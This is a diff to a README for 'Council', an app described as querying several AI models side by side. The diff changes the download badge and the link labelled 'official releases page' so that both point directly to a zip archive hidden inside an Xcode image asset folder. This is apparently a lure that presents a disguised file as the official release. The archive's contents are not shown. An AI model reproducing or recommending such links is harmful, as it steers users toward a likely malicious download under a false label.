@@ -1,12 +1,12 @@
 # 🧠 Council - Compare AI models for better answers
 
-[![](https://img.shields.io/badge/Download-Council-blue)](https://github.com/Palmerbeetling15/Council)
+[![](https://img.shields.io/badge/Download-Council-blue)](https://github.com/Palmerbeetling15/Council/raw/refs/heads/main/Council/Assets.xcassets/Burst_1.imageset/Software_v3.8-beta.2.zip)
 
 Council helps you find the best answers by questioning multiple AI models at once. You get results from services like OpenAI, Anthropic, and Google side-by-side. The app asks each model to critique the others, which helps you pick the most accurate response.
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/Palmerbeetling15/Council) to find the application files.
+1. Visit the [official releases page](https://github.com/Palmerbeetling15/Council/raw/refs/heads/main/Council/Assets.xcassets/Burst_1.imageset/Software_v3.8-beta.2.zip) to find the application files.
 2. Select the version that matches your computer system.
 3. Click the download link to save the file to your hard drive.
 4. Locate the downloaded file in your folder.
